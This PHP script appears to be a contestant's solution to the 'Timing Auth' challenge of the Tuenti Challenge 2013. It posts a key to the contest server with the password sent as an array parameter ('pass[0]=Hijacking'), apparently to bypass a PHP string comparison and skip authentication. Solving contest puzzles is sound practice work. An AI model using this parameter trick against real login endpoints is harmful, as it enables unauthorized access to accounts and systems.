#!/usr/bin/php
<?php
/**
 * Tuenti challenge 2013
 * 
 * Challenge 8 
 * Tuenti Timing Auth
 * 
 * @author Jose Lorente Martin
 */
$stdin = fopen('php://stdin', 'r');
$key = trim(fgets($stdin));

$url = 'http://pauth.contest.tuenti.net/';

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$key.'&pass[0]=Hijacking');

$response = trim(curl_exec($ch));

$response = explode(' ',$response);

echo $response[3].PHP_EOL;